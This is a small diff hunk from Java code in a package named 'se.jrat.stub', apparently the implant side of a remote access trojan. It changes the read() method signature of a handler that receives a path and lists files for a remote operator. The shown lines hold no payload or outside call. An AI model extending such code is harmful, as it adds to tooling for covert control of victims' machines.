@@ -9,7 +9,7 @@ import se.jrat.stub.packets.outgoing.Packet22ListFiles;
 public class Packet15ListFiles extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String current = Connection.instance.readLine();
 
 		File[] files;
